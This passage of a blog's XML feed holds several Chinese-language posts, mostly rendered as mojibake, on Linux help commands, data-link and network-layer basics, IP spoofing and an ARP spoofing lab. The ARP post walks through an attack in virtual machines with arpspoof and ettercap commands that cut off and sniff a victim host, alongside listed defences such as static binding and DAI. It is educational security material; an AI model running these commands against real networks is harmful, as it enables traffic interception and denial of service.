(6)ã€æ¸¸æˆ(7)ã€æƒ¯ä¾‹ä¸åè®®ç­‰ã€‚ä¾‹å¦‚ Linux æ ‡å‡†æ–‡ä»¶ç³»ç»Ÿã€ç½‘ç»œåè®®ã€ASCâ…¡ï¼Œç ç­‰è¯´æ˜å†…å®¹(8)ã€ç³»ç»Ÿç®¡ç†å‘˜å¯ç”¨çš„ç®¡ç†æ¡ä»¤ (9)ã€ä¸å†…æ ¸æœ‰å…³çš„æ–‡ä»¶</p><p>é€šè¿‡ <code>man man</code> æˆ‘ä»¬å‘ç°ï¼š</p><blockquote><p>The table below shows the section numbers of the manual followed bythe types of pages they contain.</p><p>1 Executable programs or shell commandsï¼ˆå¯æ‰§è¡Œç¨‹åºæˆ– shell å‘½ä»¤ï¼‰ 2System calls (functions provided by the kernel)(ç¨‹åºæ¥å£å†…æ ¸ç³»ç»Ÿè°ƒç”¨) 3Library calls (functions within program libraries)(C åº“å‡½æ•°ç¨‹åºæ¥å£) 4Special files (usually found in /dev)(ç‰¹æ®Šæ–‡ä»¶ï¼Œæ¯”å¦‚è¯´é©±åŠ¨ç¨‹åºå’Œè®¾å¤‡æ–‡ä»¶/dev/nullï¼Œ /dev/zero ä¹‹ç±»çš„) 5 File formats and conventions, e.g./etc/passwd (æ–‡ä»¶æ ¼å¼) 6 Games(æ¸¸æˆå¨±ä¹ï¼Œå¦‚å±å¹•ä¿æŠ¤ç¨‹åº) 7 Miscellaneous(including macro package and conventions), e.g. man(7), groff(7)(æ‚é¡¹) 8System administration commands (usually only for root)(ç³»ç»Ÿç®¡ç†å‘˜å‘½ä»¤) 9Kernel routines <code>[Non standard]</code> (å†…æ ¸æƒ¯ä¾‹)</p></blockquote><h3 id="æŒ‡å®šç±»åˆ«">æŒ‡å®šç±»åˆ«</h3><p>å½“æˆ‘ä»¬éœ€è¦æŒ‡å®šç‰¹å®šçš„ç±»åˆ«æ¥æŸ¥çœ‹ï¼Œ å‘½ä»¤:<code>man [1-8] program</code>ã€‚</p><p>ä¾‹å¦‚ç›´æ¥ <code>man printf</code>å®ƒä¼šé»˜è®¤æ˜¾ç¤ºç¬¬ä¸€ä¸ªå­˜åœ¨è¯¥å‘½ä»¤çš„ç±»åˆ«ï¼Œå› æ­¤æ˜¾ç¤ºçš„æ˜¯ç¬¬ä¸€ä¸ªç±»åˆ« shellå‘½ä»¤ä¸­çš„ printfã€‚å¦‚æœä½ å¸Œæœ›æŸ¥çœ‹ c è¯­è¨€çš„ printf å¸®åŠ©ï¼Œåˆ™éœ€è¦<code>man 3 printf</code></p><p>ä¸€èˆ¬æˆ‘ä»¬å¯ä»¥é€šè¿‡ <code>whatis</code> æŸ¥çœ‹å‘½ä»¤éƒ½å¤„åœ¨å“ªäº›ç±»åˆ«ï¼Œç„¶åé€šè¿‡<code>man</code> æŒ‡å®šç±»åˆ«è¯¦ç»†çœ‹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">whatis <span class="built_in">printf</span></span></span><br><span class="line">printf (3)           - formatted output conversion</span><br><span class="line">printf (3p)          - print formatted output</span><br><span class="line">printf (1p)          - write formatted output</span><br><span class="line">printf (1)           - format and print data</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">man 3 <span class="built_in">printf</span></span></span><br></pre></td></tr></table></figure><p>é€‚ç”¨åœºæ™¯ï¼šç¬¬ä¸€æ¬¡å­¦ä¹ ä½¿ç”¨æŸä¸ªå‘½ä»¤ï¼Œå› ä¸ºå†…å®¹æ¯”è¾ƒè¯¦ç»†ã€‚</p><h2 id="info">info</h2><p>In the early '90s, the GNU project decided that "man" documentationsystem was outdated, and wrote the info command to replace it: info hasbasic hyperlinking features and a simpler markup language to use(compared to the "troff" system used for man pages). In addition, GNUadvocates against the use of man pages at all and contends that complexsoftware systems should have complete and comprehensive documentationrather than just a set of short man pages.</p><p>é€‚ç”¨åœºæ™¯ï¼šç¬¬ä¸€æ¬¡å­¦ä¹ ä½¿ç”¨æŸä¸ªå‘½ä»¤ï¼Œå› ä¸ºå†…å®¹æ¯” man è¿˜è¯¦ç»†ã€‚</p><h3 id="man-vs-info">man vs info</h3><p>They are two different documentation systems. There are actuallyother documentation systems in use, besides man and info: GNOME and KDEhave their own, HTML-based system, etc.</p><p>Differences</p><ul><li><p>Keybinding man uses less to display the manual page which in turnuses vim keybindings while info uses emacs keybindings and standardemacs commands for search, quitting etc.</p></li><li><p>Period</p><p>Info is the default format for documentation inside the GNU project,man is the much older traditional format for UNIX.</p></li><li><p>Format</p><p>Info uses Texinfo as its source format, which is a bunch of macrosfor TeX, and that makes it much easier to also create "good-looking"printed versions or PDFs. Generally, man pages are more about 1 specifictopic (a command, a config file, a system function, ...) while infonormally has more the structure of a combined manual, more like abook.</p><p>Man is giving complete command options and descriptions. info commandalso similar to man but info command listing structured level. We caneasily read and understand the command options</p></li><li><p>Content</p><p>The main difference between Man and Info is the amount of contentthat they have; Info contains a whole lot more than Man does.</p></li><li><p>Which oneï¼Ÿ</p><p>Some people like Info because they can get a lot more from it whileothers like Man because it is straight to the point and they can quicklyget what they want without wasting time.</p></li></ul><h2 id="help-é€‰é¡¹"><code>--help</code> é€‰é¡¹</h2><p><code>--help</code>é€‰é¡¹å¹¶ä¸æ˜¯æ‰€æœ‰å‘½ä»¤éƒ½æœ‰çš„ï¼Œä¸è¿‡ï¼Œæ ¹æ®æˆ‘ä½¿ç”¨çš„ç»éªŒæ¥çœ‹ï¼Œå¤§éƒ¨åˆ†å¤–éƒ¨å‘½ä»¤éƒ½æ˜¯æœ‰çš„ã€‚å®ƒæ˜¾ç¤ºçš„ä¿¡æ¯æ¯”<code>man</code> ç²¾ç®€ä¸€äº›</p><p>é€‚ç”¨åœºæ™¯ï¼š å­¦è¿‡è¯¥å‘½ä»¤ï¼Œä½†æ˜¯å¿˜äº†æŸä¸ªé€‰é¡¹ï¼Œæ­¤æ—¶ï¼Œä½¿ç”¨<code>--help</code> ç®€æ´æ˜äº†ã€‚</p><h2 id="å‚è€ƒèµ„æ–™">å‚è€ƒèµ„æ–™</h2><p><ahref="https://linuxtools-rst.readthedocs.io/zh_CN/latest/base/01_use_man.html">1.å­¦ä¼šä½¿ç”¨å‘½ä»¤å¸®åŠ©</a> <ahref="https://superuser.com/questions/40301/which-whereis-differences">which/whereisdifferences</a> <ahref="https://linuxize.com/post/linux-type-command/">Linux TypeCommand</a> <ahref="https://askubuntu.com/questions/9325/what-is-the-difference-between-man-and-info-documentation">Whatis the difference between â€œmanâ€ and â€œinfoâ€ documentation?</a> <ahref="https://unix.stackexchange.com/questions/19451/difference-between-help-info-and-man-command">Differencebetween help, info and man command</a></p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ARP æ¬ºéª—</title>
      <link href="/blog/2020/07/17/network/arp_spoofing/"/>
      <url>/blog/2020/07/17/network/arp_spoofing/</url>
      
        <content type="html"><![CDATA[<p>ARP åè®®çš„æœ‰æ•ˆæ€§åŸºäºè¿™æ ·ä¸€ä¸ªå‰æ: å³ï¼šç½‘ç»œä¸Šçš„èŠ‚ç‚¹æ˜¯è¯šå®çš„ï¼ŒèŠ‚ç‚¹ä¸ä¼šå“åº”ä¸å…¶ä¸ç›¸å…³çš„ ARP è¯·æ±‚ï¼ŒèŠ‚ç‚¹ä¹Ÿä¸ä¼šå‘é€ä¸æ­£ç¡®çš„ IP-MAC æ˜ å°„çš„ ARP å“åº”ã€‚ä½†å®é™…ä¸Šå¹¶ä¸æ˜¯è¿™æ ·ã€‚</p><h2 id="ç®€ä»‹">ç®€ä»‹</h2><p>æ— è®ºèŠ‚ç‚¹æ”¶åˆ° ARP è¯·æ±‚è¿˜æ˜¯å“åº”ï¼Œè¯¥èŠ‚ç‚¹å‡ä¼šæ›´æ–°å…¶ ARPè¡¨ã€‚è‹¥æ— å¯¹åº”è¡¨é¡¹ï¼Œåˆ™æ·»åŠ è¯¥è¡¨é¡¹; åä¹‹ï¼Œåˆ™æ›´æ–°å¯¹åº”çš„è¡¨é¡¹ã€‚</p><p>ARP spoofing æ”»å‡»ï¼šæ”»å‡»è€…é€šè¿‡å‘é€ä¸æ­£ç¡®çš„ IP-MAC æ˜ å°„ä¿¡æ¯ï¼Œç»“æœå¯¼è‡´å±€åŸŸç½‘å†…è¢«æ”»å‡»ä¸»æœºå‘é€ç»™ç½‘å…³çš„æµé‡ä¿¡æ¯å®é™…ä¸Šéƒ½å‘é€ç»™æ”»å‡»è€…ï¼Œè¿™æ ·å°±ä¼šé€ æˆçªƒå¬ä»¥åŠä¸­é—´äººæ”»å‡»ã€‚</p><p>æ¬ºéª—æ–¹å¼ï¼š</p><ol type="1"><li><p>æ¬ºéª—ä¸»æœºä½œä¸ºâ€œä¸­é—´äººâ€ï¼Œå®šæœŸå‘é€ ARPå“åº”ï¼Œè¢«æ¬ºéª—ä¸»æœºçš„æ•°æ®éƒ½ç»è¿‡å®ƒä¸­è½¬ä¸€æ¬¡ï¼Œè¿™æ ·æ¬ºéª—ä¸»æœºå¯ä»¥çªƒå–åˆ°è¢«å®ƒæ¬ºéª—çš„ä¸»æœºä¹‹é—´çš„é€šè®¯æ•°æ®ï¼›</p></li><li><p>è®©è¢«æ¬ºéª—ä¸»æœºç›´æ¥æ–­ç½‘ã€‚ é€šè¿‡ <code>arpspoofing</code>å¯¹å—å®³è€…ä¸»æœºè¿›è¡Œ arpæ¬ºéª—åˆ°è‡ªå·±æˆ–è€…åˆ«çš„ä¸»æœºï¼Œä½†æ˜¯ä¸è½¬å‘å—å®³è€…ä¸»æœºå‘é€æ¥çš„æµé‡ï¼Œå› æ­¤ï¼Œå®ç°æ–­ç½‘çš„æ•ˆæœã€‚</p></li></ol><p>è§£å†³æ–¹æ¡ˆï¼š</p><ol type="1"><li>ç”±ç½‘å…³ç­‰è®¾å¤‡æˆ–è€…è½¯ä»¶å®šæœŸå‘é€æ­£ç¡®çš„ ARP ä¿¡æ¯ï¼ˆæ²¡å•¥ç”¨ï¼‰</li><li>é™æ€ç»‘å®š ARP æ¡ç›®ï¼Œåœ¨ç½‘å…³å’Œ PC ä¸ŠåŒå‘ç»‘å®š</li><li>DAIï¼ˆå½»åº•è§£å†³ï¼‰</li></ol><p>ARP æ¬ºéª—çš„åŒå‘æ€§ï¼š</p><p>ARP æœ¬è´¨æ˜¯é‡å®šå‘ï¼Œå³é€šè¿‡æ¬ºéª—æ€§çš„ MAC - IPæ˜ å°„å°†æ•°æ®å¼•å¯¼åˆ°æŸä¸ªèŠ‚ç‚¹ï¼Œè€Œé‡å®šå‘ä¸ä¸€å®šæ˜¯ä¸€ç§æ”»å‡»ã€‚ä¾‹å¦‚ï¼šä½¿ç”¨ä¸¤å°æœåŠ¡å™¨æä¾›ç½‘ç»œæœåŠ¡ï¼Œå…¶ä¸­ä¸€å°ä½œä¸ºå¤‡ç”¨æœºå™¨ã€‚å½“ä¸»åŠ¡å™¨å¤±è´¥æ—¶ï¼Œå¯ä»¥é€šè¿‡ARP æ¬ºéª—å°†æ•°æ®åŒ…å®šå‘åˆ°å¤‡ä»½æœåŠ¡å™¨ï¼Œå®ç°ç”¨æˆ·é€æ˜çš„åˆ‡æ¢ã€‚</p><h2 id="å®æˆ˜">å®æˆ˜</h2><h3 id="å®éªŒç¯å¢ƒ">å®éªŒç¯å¢ƒ</h3><h3id="æœ¬å®éªŒåœ¨è™šæ‹Ÿæœºä¸­å®Œæˆå®é™…æ•ˆæœä¸çœŸå®ä¸»æœºæ•ˆæœæ— å¼‚">æœ¬å®éªŒåœ¨è™šæ‹Ÿæœºä¸­å®Œæˆï¼ˆå®é™…æ•ˆæœä¸çœŸå®ä¸»æœºæ•ˆæœæ— å¼‚ï¼‰</h3><ol type="1"><li><p>å®éªŒè¦æ±‚ï¼šä¸¤ä¸ªä¸»æœºçš„ç½‘ç»œå¿…é¡»åŒåœ¨ä¸€ä¸ªå±€åŸŸç½‘å†…ï¼Œå¦åˆ™æ— æ³•å®ç°ã€‚Manjaro Linux ç³»ç»Ÿä¸»æœºä¸€å°ï¼ˆå—å®³è€…çš„ä¸»æœºï¼‰, IP: 10.252.254.241/21 Kaliç³»ç»Ÿä¸»æœºä¸€å°ï¼ˆè™šæ‹Ÿæœºï¼Œæ”»å‡»è€…çš„ä¸»æœºï¼‰, IP: 10.252.252.250/21 ç½‘å…³IPï¼š10.252.248.1/21</p></li><li><p>æ”»å‡»è€…ä¸»æœºå¼€å¯æµé‡è½¬å‘</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo su</span><br><span class="line">echo 1 &gt; /proc/sys/net/ipv4/ip_forward</span><br></pre></td></tr></table></figure></p><p>å‚è€ƒ <ahref="https://linuxconfig.org/how-to-turn-on-off-ip-forwarding-in-linux">Howto Disable/Enable IP forwarding in Linux</a></p></li></ol><h3 id="å·¥å…·ä½¿ç”¨">å·¥å…·ä½¿ç”¨</h3><p>å·¥å…·è¦æ±‚ï¼š <code>fping</code>ï¼Œ <code>arpspoofing</code>,<code>ettercap</code></p><ol type="1"><li><p><code>fping</code> æ‰«ææŸ¥çœ‹å†…ç½‘åœ¨çº¿ä¸»æœº</p><p><code>fping -asg ç½‘å…³åœ°å€/å­ç½‘æ©ç </code>å…·ä½“å‘½ä»¤å«ä¹‰å¯ä»¥è§æˆ‘çš„åšå®¢é“¾æ¥ï¼š - [ ] blog link</p></li><li><p><code>arpspoof</code> è¿›è¡Œ ARP æ¬ºéª— arch linux å®‰è£…<code>sudo pacman -S dsniff</code> æŸ¥çœ‹ä½¿ç”¨åŠæ³• arpspoof -h Usage:arpspoof [-i interface][-c own|host|both] [-t target][-r] host å¯¹åº”ï¼š<code>arpspoof -i ç½‘å¡ -t ç›®æ ‡Ip ç½‘å…³</code></p><p>æ”»å‡»è€…å‘å—å®³è€…ä¸»æœºå‘é€çš„ ARP å“åº”ï¼Œä¼ªé€ ç½‘å…³ IP ä¸ºæº IP,è‡ªå·±ï¼ˆæ”»å‡»è€…çš„ä¸»æœºï¼‰çš„ï¼ŒMAC åœ°å€ä¸ºæº MACåœ°å€ã€‚è¿™æ ·å—å®³è€…ä¸»æœºåœ¨è®¿é—®ç½‘ç»œæ—¶ï¼Œå°±ä¼šè¯¯å°†æ”»å‡»è€…ä½œä¸ºç½‘å…³ï¼Œä»è€Œå°†æ•°æ®å¸§è½¬å‘åˆ°æ”»å‡»è€…ã€‚æ­¤æ—¶å¦‚æœæ”»å‡»è€…ä¸è¿›è¡Œä»»ä½•å…¶ä»–æ“ä½œï¼Œå—å®³è€…ä¸»æœºå°±ä¼šå¤„äºæ–­ç½‘çŠ¶æ€ï¼›å¦‚æœæ”»å‡»è€…è½¬å‘æŸ¥çœ‹æµé‡åŒ…ï¼Œå°±å¯ä»¥è¿›è¡Œç›‘å¬æˆ–è€…ä¸­é—´äººæ”»å‡»äº†ã€‚</p></li><li><p><code>ettercap</code> å—…æ¢æµé‡ï¼Œä¸­é—´äººæ”»å‡»<code>sudo ettercap -Tq -i ç½‘å¡</code></p></li></ol><h3 id="æ¼”ç¤º">æ¼”ç¤º</h3><ol type="1"><li>kali ä½œä¸ºæ”»å‡»è€…ï¼Œé¦–å…ˆè¿›è¡Œ arp æ¬ºéª—æ”»å‡»å‘½ä»¤ï¼š<code>arpspoof -i eth0 -t 10.252.254.241 10.252.248.1</code></li><li>ç„¶åæˆ‘ä»¬å‘ç°è¢«æ”»å‡»è€…è¿ä¸ä¸Šç½‘äº†</li><li>kali æ”»å‡»è€…ï¼Œå†æ‰“å¼€ <code>ettercap</code> è¿›è¡Œå—…æ¢è½¬å‘ï¼Œå‘½ä»¤ï¼š<code>ettercap -Tq -i eth0</code></li><li>å—å®³è€…å¯ä»¥ä¸Šç½‘ï¼Œæ”»å‡»è€…æ•è·å—å®³è€…çš„æ‰€æœ‰æ•°æ®åŒ…ã€‚</li></ol><h2 id="å®éªŒè¿‡ç¨‹é‡åˆ°çš„é—®é¢˜">å®éªŒè¿‡ç¨‹é‡åˆ°çš„é—®é¢˜</h2><ol type="1"><li>arch linux æºçš„ <code>ettercap</code> åŒ…æœ¬èº«æœ‰é—®é¢˜</li><li>æ–°ç‰ˆ kali çš„å˜åŒ– é»˜è®¤é root ç”¨æˆ·ï¼Œ æ™®é€šç”¨æˆ·åå¯†ç å‡å˜ä¸ºäº†<code>kali</code>ï¼Œå¯¼è‡´å¾ˆå¤šå·¥å…·åœ¨æ™®é€šç”¨æˆ·æƒé™ä¸‹è¿è¡Œï¼Œ<strong>ç›´æ¥æ˜¾ç¤ºå‘½ä»¤ä¸å­˜åœ¨</strong>ï¼Œåªæœ‰æ‹¥æœ‰ root æƒé™æ—¶æ‰èƒ½ä½¿ç”¨ã€‚</li><li><code>arpspoof</code> å‘½ä»¤å­˜åœ¨äº <code>dsniff</code> åŒ…ä¸­</li></ol><h2 id="å‚è€ƒèµ„æ–™">å‚è€ƒèµ„æ–™</h2><blockquote><ol type="1"><li><ahref="https://blog.csdn.net/qq_33936481/article/details/51286486">ARPæ–­ç½‘æ”»å‡»å’Œæ¬ºéª—å®ç° kali</a></li><li><ahref="https://security.stackexchange.com/questions/189203/unable-to-locate-package-arpspoof">unableto locate package Arpspoof [closed]</a></li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> network </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>æ•°æ®é“¾è·¯å±‚</title>
      <link href="/blog/2020/07/17/network/link/"/>
      <url>/blog/2020/07/17/network/link/</url>
      
        <content type="html"><![CDATA[<h2 id="ç®€ä»‹">ç®€ä»‹</h2><p>æ•°æ®é“¾è·¯å±‚ï¼ˆData Link Layerï¼‰æ˜¯ OSIæ¨¡å‹çš„ç¬¬äºŒå±‚ï¼Œè´Ÿè´£å»ºç«‹å’Œç®¡ç†èŠ‚ç‚¹é—´çš„é“¾è·¯ã€‚è¯¥å±‚çš„ä¸»è¦åŠŸèƒ½æ˜¯ï¼šé€šè¿‡å„ç§æ§åˆ¶åè®®ï¼Œå°†æœ‰å·®é”™çš„ç‰©ç†ä¿¡é“å˜ä¸ºæ— å·®é”™çš„ã€èƒ½å¯é ä¼ è¾“æ•°æ®å¸§çš„æ•°æ®é“¾è·¯ã€‚</p><p>åœ¨è®¡ç®—æœºç½‘ç»œä¸­ç”±äºå„ç§å¹²æ‰°çš„å­˜åœ¨ï¼Œç‰©ç†é“¾è·¯æ˜¯ä¸å¯é çš„ã€‚å› æ­¤ï¼Œè¿™ä¸€å±‚çš„ä¸»è¦åŠŸèƒ½æ˜¯åœ¨ç‰©ç†å±‚æä¾›çš„æ¯”ç‰¹æµçš„åŸºç¡€ä¸Šï¼Œé€šè¿‡å·®é”™æ§åˆ¶ã€æµé‡æ§åˆ¶æ–¹æ³•ï¼Œä½¿æœ‰å·®é”™çš„ç‰©ç†çº¿è·¯å˜ä¸ºæ— å·®é”™çš„æ•°æ®é“¾è·¯ï¼Œå³æä¾›å¯é çš„é€šè¿‡ç‰©ç†ä»‹è´¨ä¼ è¾“æ•°æ®çš„æ–¹æ³•ã€‚</p><p>æ•°æ®é“¾è·¯å±‚çš„å…·ä½“å·¥ä½œæ˜¯æ¥æ”¶æ¥è‡ªç‰©ç†å±‚çš„ä½æµå½¢å¼çš„æ•°æ®ï¼Œå¹¶å°è£…æˆå¸§ï¼Œä¼ é€åˆ°ä¸Šä¸€å±‚ï¼›åŒæ ·ï¼Œä¹Ÿå°†æ¥è‡ªä¸Šå±‚çš„æ•°æ®å¸§ï¼Œæ‹†è£…ä¸ºä½æµå½¢å¼çš„æ•°æ®è½¬å‘åˆ°ç‰©ç†å±‚ï¼›å¹¶ä¸”ï¼Œè¿˜è´Ÿè´£å¤„ç†æ¥æ”¶ç«¯å‘å›çš„ç¡®è®¤å¸§çš„ä¿¡æ¯ï¼Œä»¥ä¾¿æä¾›å¯é çš„æ•°æ®ä¼ è¾“ã€‚</p><p>æ•°æ®é“¾è·¯å±‚çš„åè®®æ•°æ®å•å…ƒ(Protocol Data Unit)ä¸ºæ•°æ®å¸§ã€‚</p><h2 id="å¸¸ç”¨è®¾å¤‡">å¸¸ç”¨è®¾å¤‡</h2><p>ä»¥å¤ªç½‘é‡‡ç”¨æ˜Ÿå‹æ‹“æ‰‘ç»“æ„ï¼Œä½¿ç”¨é›†çº¿å™¨ï¼ˆhubï¼‰æˆ–ï¼ˆswitchï¼‰è¿æ¥ç½‘ç»œèŠ‚ç‚¹ã€‚</p><p>æ—©æœŸé‡‡ç”¨é›†çº¿å™¨ï¼Œé›†çº¿å™¨æ˜¯ä¸€ç§ç‰©ç†å±‚è®¾å¤‡ï¼Œå…¶ä¸Šåªæœ‰æ¯”ç‰¹çš„æ¦‚å¿µï¼Œè€Œæ— å¸§çš„æ¦‚å¿µã€‚é›†çº¿å™¨çš„ä¸»è¦åŠŸèƒ½æ˜¯å¯¹æ¥æ”¶åˆ°çš„ä¿¡å·è¿›è¡Œå†ç”Ÿæ•´å½¢æ”¾å¤§ï¼Œä»¥æ‰©å¤§ç½‘ç»œçš„ä¼ è¾“è·ç¦»ï¼Œç®€è€Œè¨€ä¹‹ï¼Œå°±æ˜¯æ¥å—ä¿¡å·ï¼Œå¹¿æ’­ä¿¡å·ã€‚å› æ­¤ï¼Œä»»ä½•èŠ‚ç‚¹éƒ½å¯ä»¥é€šè¿‡æŠŠç½‘å¡è®¾ç½®ä¸ºæ··æ‚æ¨¡å¼ï¼ˆpromiscuousmodeï¼‰è¿›è¡Œçªƒå¬ã€‚</p><p>21ä¸–çºªä»¥åï¼Œé›†çº¿å™¨é€æ¸è¢«äº¤æ¢æœºæ›¿ä»£ã€‚äº¤æ¢æœºä»¥å¸§çš„æ¦‚å¿µè¿›è¡Œå·¥ä½œã€‚æ ¹æ®äº¤æ¢æœºè¡¨æ¥å†³å®šå°†åˆ°è¾¾çš„å¸§å‘é€åˆ°é‚£ä¸ªç«¯å£ï¼Œè€Œä¸æ˜¯å¹¿æ’­æ¥å—åˆ°çš„å¸§ã€‚äº¤æ¢æœºè¡¨åŒ…æ‹¬ä¸‰ä¸ªå­—æ®µï¼šèŠ‚ç‚¹çš„MAC åœ°å€ï¼Œè¯¥ MAC åœ°å€å¯¹åº”çš„ç«¯å£ï¼Œè¯¥è¡¨é¡¹åœ¨è¡¨ä¸­çš„æ—¶é—´ã€‚</p><p>å¯¹äºä¸¤ç§æƒ…å†µï¼Œäº¤æ¢æœºä¼šé‡‡ç”¨å¹¿æ’­æ–¹å¼å‘é€æ•°æ®ï¼š</p><ol type="1"><li>å¦‚æœå¸§çš„ç›®çš„ MAC åœ°å€ä¸ºå¹¿æ’­åœ°å€ FF-FF-FF-FF-FF-FF</li><li>å¦‚æœå¸§çš„ç›®çš„ MAC åœ°å€åœ¨äº¤æ¢è¡¨ä¸­æŸ¥ä¸åˆ°çš„è¡¨é¡¹</li></ol><h2 id="å¸¸è§åè®®">å¸¸è§åè®®</h2><ol type="1"><li>4 ç§ VPN éš§é“åè®®ä¸­çš„ä¸¤ç§<ol type="1"><li>ç‚¹åˆ°ç‚¹éš§é“åè®® PPTP(The Point-to-Point Tunneling Protocol)</li><li>ç¬¬äºŒå±‚éš§é“åè®® L2TP(Layer Two Tunneling Protocol)</li></ol></li><li>ARP/RARPï¼ˆåœ°å€è§£æåè®®/åå‘åœ°å€è§£æåè®®ï¼‰</li></ol><h2 id="å‚è€ƒèµ„æ–™">å‚è€ƒèµ„æ–™</h2><p><a href="https://www.e365.info/?p=48621">34.æ•°æ®é“¾è·¯å±‚</a></p>]]></content>
      
      
      <categories>
          
          <category> network </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ç½‘ç»œå±‚</title>
      <link href="/blog/2020/07/17/network/network/"/>
      <url>/blog/2020/07/17/network/network/</url>
      
        <content type="html"><![CDATA[<h2 id="ip-address-spoofing">IP Address Spoofing</h2><p>æ ¹æ® IP åè®®ï¼Œ è·¯ç”±å™¨åªæ˜¯æ ¹æ® IP åˆ†ç»„çš„ç›®çš„ IP åœ°å€æ¥ç¡®å®šè¯¥ IPåˆ†ç»„ä»å“ªä¸€ä¸ªç«¯å£å‘é€çš„ï¼Œè€Œä¸å…³å¿ƒè¯¥ IP åˆ†ç»„çš„æº IPåœ°å€ã€‚åŸºäºè¯¥åŸç†ï¼Œä»»æ„èŠ‚ç‚¹å‡å¯ä»¥æ„é€  IP åˆ†ç»„ã€‚</p><p>IP æ¬ºéª—æ”»å‡»ä¸»è¦ç”¨äºä¸¤ç§ç½‘ç»œæ”»å‡»æ–¹å¼: æ‹’ç»æœåŠ¡æ”»å‡»å’ŒåŸºäº IPåœ°å€è®¤è¯çš„ç½‘ç»œæœåŠ¡ä¸­ã€‚</p><h3 id="å®ç°">å®ç°</h3><ol type="1"><li>scapyï¼ˆä¾èµ–äº tcpdumpï¼‰å·¥å…·æˆ–è€… Python çš„ scapy æ¨¡å—ï¼Œè½»æ˜“åœ°ä¼ªé€  IP<a href="https://www.jianshu.com/p/cc7fa0d64c15">åˆ©ç”¨ Linux scapyä¼ªé€ æ•°æ®åŒ…æ”»å‡»</a><ul class="task-list"><li><label><input type="checkbox" />scapy å­¦ä¹ </label></li></ul></li><li>å¯ä»¥ç›´æ¥è‡ªå·±é€šè¿‡ raw socket ç¼–ç¨‹è¿›è¡Œä¼ªé€  IPã€‚</li></ol><h3 id="åˆæ³•ç”¨é€”">åˆæ³•ç”¨é€”</h3><p>ä½¿ç”¨å…·æœ‰é”™è¯¯æº IPåœ°å€çš„æ•°æ®åŒ…å¹¶ä¸æ€»æ˜¯ç”¨äºæ¶æ„ä¼å›¾ã€‚ä¾‹å¦‚ï¼Œåœ¨ç½‘ç«™æ€§èƒ½æµ‹è¯•ï¼Œæˆç™¾ä¸Šåƒçš„â€œç”¨æˆ·â€ï¼ˆè™šæ‹Ÿç”¨æˆ·ï¼‰å¯èƒ½è¢«åˆ›å»ºï¼Œæ¯ä¸ªéƒ½åœ¨æ‰§è¡Œæµ‹è¯•ç½‘ç«™çš„æµ‹è¯•è„šæœ¬ï¼Œä»¥æ¨¡æ‹Ÿå½“ç³»ç»Ÿä¸Šçº¿å’Œå¤§é‡ç”¨æˆ·ç«‹åˆ»ç™»å½•æ—¶ä¼šå‘ç”Ÿä»€ä¹ˆäº‹ã€‚</p><p>ç”±äºæ¯ä¸ªç”¨æˆ·éƒ½ä¼šæœ‰è‡ªå·±çš„ IP åœ°å€ï¼Œå•†ä¸šæµ‹è¯•äº§å“ï¼ˆå¦‚ HPLoadRunnerã€WebLOAD ç­‰ï¼‰å¯ä»¥ä½¿ç”¨ IPæ¬ºéª—ï¼ŒåŒæ ·å…è®¸æ¯ä¸ªç”¨æˆ·è‡ªå·±çš„â€œè¿”å›åœ°å€â€ã€‚</p><ul class="task-list"><li><label><input type="checkbox" />æœªå®Œå¾…ç»­</label></li></ul><h2 id="å‚è€ƒèµ„æ–™">å‚è€ƒèµ„æ–™</h2><p><ahref="https://zh.wikipedia.org/wiki/IP%E5%9C%B0%E5%9D%80%E6%AC%BA%E9%AA%97#%E5%BA%94%E7%94%A8">IPåœ°å€æ¬ºéª—</a></p><p><ahref="http://www.cis.syr.edu/~wedu/seed/Labs_16.04/Networking/Sniffing_Spoofing/Sniffing_Spoofing.pdf">PacketSniffing and Spoofing Lab</a></p>]]></content>
      
      
      <categories>
          
          <category> network </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>OSI 7 å±‚æ¨¡å‹åŠå…¶å®‰å…¨éšæ‚£</title>
      <link href="/blog/2020/07/17/network/osi_layer/"/>
      <url>/blog/2020/07/17/network/osi_layer/</url>
      
        <content type="html"><![CDATA[<p>ICMP æ˜¯ç½‘ç»œå±‚ï¼Œç›®å‰ VPN éš§é“åè®®ä¸»è¦æœ‰ 4 ç§ï¼šç‚¹åˆ°ç‚¹éš§é“åè®®PPTPã€ç¬¬äºŒå±‚éš§é“åè®® L2TPã€ç½‘ç»œå±‚éš§é“åè®® IPSec ä»¥åŠ SOCKS v5åè®®ã€‚å…¶ä¸­ï¼ŒPPTP å’Œ L2TP å·¥ä½œåœ¨æ•°æ®é“¾è·¯å±‚ï¼ŒIPSec å·¥ä½œåœ¨ç½‘ç»œå±‚ï¼ŒSOCK v5å·¥ä½œåœ¨ä¼šè¯å±‚</p><p>ARP å’Œ RARPæ˜¯ç½‘ç»œå±‚çš„åè®®ï¼Œä½†æ˜¯å®ƒæ‰€å·¥ä½œçš„å†…å®¹æ˜¯é“¾è·¯å±‚çš„ã€‚å…·ä½“æ¥è¯´åº”è¯¥æ˜¯åœ¨ç½‘ç»œå±‚ã€‚</p><h3 id="åº”ç”¨å±‚">7. åº”ç”¨å±‚</h3><h3 id="dns">DNS</h3><p>DNS é€’å½’æŸ¥è¯¢</p><pre><code>DNS å®¢æˆ·ç«¯ä¸æœ¬åœ° DNS 